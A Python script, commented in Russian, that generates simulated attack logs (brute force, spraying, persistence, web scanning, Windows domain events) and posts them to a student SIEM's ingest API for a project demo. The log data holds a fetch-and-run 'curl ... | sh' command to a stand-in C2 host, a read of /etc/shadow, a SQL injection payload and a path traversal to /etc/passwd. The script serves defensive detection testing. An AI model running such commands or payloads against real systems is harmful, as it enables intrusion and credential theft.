#!/usr/bin/env python3
"""Генератор демонстрационных событий и атак для SecureWatch SIEM.

Отправляет журналы в SIEM через тот же API, что и MP agent, чтобы на защите проекта
показать весь путь данных: агент → Receiver → … → корреляция → инцидент.

    python3 tools/simulate_attack.py --server http://127.0.0.1:8080 --token swa_...
    python3 tools/simulate_attack.py ... --scenario bruteforce
    python3 tools/simulate_attack.py ... --print > demo.log   # просто вывести строки

Все «атакующие» адреса взяты из документационных диапазонов (RFC 5737) — это не реальные хосты.
"""

import argparse
import json
import random
import sys
import urllib.request
from datetime import datetime, timedelta, timezone

ATTACKER = "203.0.113.10"
SPRAYER = "203.0.113.25"
SCANNER = "198.51.100.7"       # входит в демо-IoC (198.51.100.0/24)
C2 = "203.0.113.66"            # входит в демо-IoC
OFFICE = ["192.168.10.21", "192.168.10.34", "192.168.10.57"]
USERS = ["ivanov", "petrova", "sidorov", "kuznetsova"]


class Clock:
    def __init__(self):
        self.t = datetime.now(timezone.utc).astimezone() - timedelta(minutes=10)

    def tick(self, seconds=1.0):
        self.t += timedelta(seconds=seconds)
        return self.t

    def syslog(self, host, app, msg, seconds=1.0):
        ts = self.tick(seconds).isoformat(timespec="seconds")
        return {"host": host, "line": f"{ts} {host} {app}[{random.randint(1000, 9999)}]: {msg}"}

    def access(self, host, ip, method, path, code, ua="Mozilla/5.0", seconds=0.3):
        ts = self.tick(seconds).strftime("%d/%b/%Y:%H:%M:%S %z")
        return {"host": host, "format": "access",
                "line": f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {code} {random.randint(200, 9000)} "-" "{ua}"'}

    def windows(self, host, event_id, seconds=1.0, **fields):
        data = {"EventID": event_id, "Computer": host,
                "TimeCreated": self.tick(seconds).astimezone(timezone.utc).isoformat(timespec="seconds"), **fields}
        return {"host": host, "format": "windows", "line": json.dumps(data, ensure_ascii=False)}


def noise(c):
    out = []
    for _ in range(25):
        user, ip = random.choice(USERS), random.choice(OFFICE)
        out.append(c.syslog("web01", "sshd", f"Accepted publickey for {user} from {ip} port {random.randint(40000, 60000)} ssh2", 5))
        out.append(c.access("web01", ip, "GET", random.choice(["/", "/login", "/static/app.css", "/api/news"]), 200, seconds=2))
        out.append(c.syslog("db01", "CRON", "(root) CMD (/usr/local/bin/backup.sh)", 3))
    return out


def bruteforce(c):
    out = [c.syslog("web01", "sshd", f"Failed password for admin from {ATTACKER} port {50000 + i} ssh2", 2) for i in range(12)]
    out.append(c.syslog("web01", "sshd", f"Accepted password for admin from {ATTACKER} port 50100 ssh2", 3))
    return out


def spraying(c):
    return [c.syslog("vpn01", "sshd", f"Failed password for invalid user {u} from {SPRAYER} port {41000 + i} ssh2", 4)
            for i, u in enumerate(["test", "guest", "oracle", "ubuntu", "postgres", "backup", "support"])]


def persistence(c):
    return [
        c.syslog("web01", "useradd", "new user: name=svc_update, UID=1005, GID=1005, home=/home/svc_update", 20),
        c.syslog("web01", "usermod", "add 'svc_update' to group 'sudo'", 5),
        c.syslog("web01", "sudo", "  svc_update : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow", 10),
        c.syslog("web01", "sudo", "  svc_update : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl -s http://203.0.113.66/x.sh | sh", 10),
    ]


def web_attack(c):
    out = [c.access("web01", SCANNER, "GET", f"/{p}", 404, ua="gobuster/3.6")
           for p in ["admin", "backup", ".git/config", "wp-admin", "phpmyadmin", ".env", "old", "test", "api/v1/debug",
                     "server-status", "config.php", "db.sql", "uploads", "cgi-bin", "console", "manager/html",
                     "actuator", "debug", "install", "setup", "shell.php", "info.php", "login.bak", "admin.php",
                     "user", "users", "private", "secret", "tmp", "logs", "dump"]]
    out.append(c.access("web01", SCANNER, "GET", "/products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", 500, ua="sqlmap/1.8"))
    out.append(c.access("web01", SCANNER, "GET", "/download?file=../../../../etc/passwd", 403, ua="curl/8.5"))
    return out


def c2(c):
    return [c.syslog("db01", "sshd", f"Accepted publickey for backup from {C2} port 443 ssh2", 30)]


def windows_domain(c):
    out = [c.windows("DC01", 4625, 2, TargetUserName="Администратор", IpAddress="192.168.10.99") for _ in range(6)]
    out += [
        c.windows("DC01", 4740, 1, TargetUserName="Администратор"),
        c.windows("DC01", 4720, 30, TargetUserName="helpdesk2", SubjectUserName="petrova"),
        c.windows("DC01", 4732, 5, TargetUserName="helpdesk2", GroupName="Администраторы", SubjectUserName="petrova"),
        c.windows("DC01", 7045, 10, ServiceName="WinUpdateSvc", SubjectUserName="helpdesk2"),
        c.windows("DC01", 1102, 15, SubjectUserName="helpdesk2"),
    ]
    return out


SCENARIOS = {"noise": noise, "bruteforce": bruteforce, "spraying": spraying, "persistence": persistence,
             "web": web_attack, "c2": c2, "windows": windows_domain}


def post(server, token, records):
    by_host = {}
    for r in records:
        by_host.setdefault(r.pop("host"), []).append(r)
    total = 0
    for host, items in by_host.items():
        for i in range(0, len(items), 500):
            body = json.dumps({"host": host, "records": items[i:i + 500]}).encode()
            req = urllib.request.Request(f"{server.rstrip('/')}/api/v1/ingest", data=body, method="POST",
                                         headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"})
            with urllib.request.urlopen(req, timeout=15) as resp:
                total += json.loads(resp.read())["accepted"]
    return total


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--server", default="http://127.0.0.1:8080")
    parser.add_argument("--token")
    parser.add_argument("--scenario", choices=["all", *SCENARIOS], default="all")
    parser.add_argument("--print", action="store_true", help="вывести строки в stdout вместо отправки")
    args = parser.parse_args()

    clock = Clock()
    names = list(SCENARIOS) if args.scenario == "all" else [args.scenario]
    records = [r for name in names for r in SCENARIOS[name](clock)]
    if args.print:
        for r in records:
            print(r["line"])
        return
    if not args.token:
        parser.error("нужен --token (создайте агента в разделе «Агенты»)")
    print(f"Сценарии: {', '.join(names)}; записей: {len(records)}")
    print(f"Принято SIEM: {post(args.server, args.token, records)}")


if __name__ == "__main__":
    sys.exit(main())
